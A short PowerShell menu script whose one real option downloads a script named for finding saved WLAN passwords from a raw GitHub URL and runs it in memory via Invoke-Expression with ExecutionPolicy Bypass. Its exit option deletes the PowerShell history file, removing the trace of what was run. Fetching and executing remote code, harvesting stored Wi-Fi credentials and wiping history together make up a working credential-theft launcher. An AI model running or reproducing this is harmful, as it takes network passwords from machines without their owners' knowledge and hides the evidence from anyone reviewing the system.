# Menu function to display options and get user input
function Show-Menu {
    Clear-Host
    Write-Host " -------------------------------------------------- "
    Write-Host "|                    SCRIPT MENU                   |"
    Write-Host " -------------------------------------------------- "
    Write-Host "0. Exit"
    Write-Host "1. Find saved WLAN passwords"
 
    Write-Host
    $keyInfo = [System.Console]::ReadKey($true)
    $choice = $keyInfo.KeyChar.ToString()

    # Process user input
    switch ($choice) {
        "0" { Run-Script0 }
        "1" { Run-Script1 }
        default { 
            Write-Host "Invalid choice. Please try again."
            Show-Menu
        }
    }
}

# Define individual script functions
function Run-Script0 {
    Write-Host "Clearing Powershell history before exiting..."
    Remove-Item (Get-PSReadlineOption).HistorySavePath
    exit
}

function Run-Script1 {   
    powershell -ExecutionPolicy Bypass -Command "Invoke-Expression ((Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/error404eu/Scripts/main/WLAN-PSW-Finder.ps1').Content);"
}

# Main loop to display the menu and process user input
while ($true) {
    Show-Menu
}
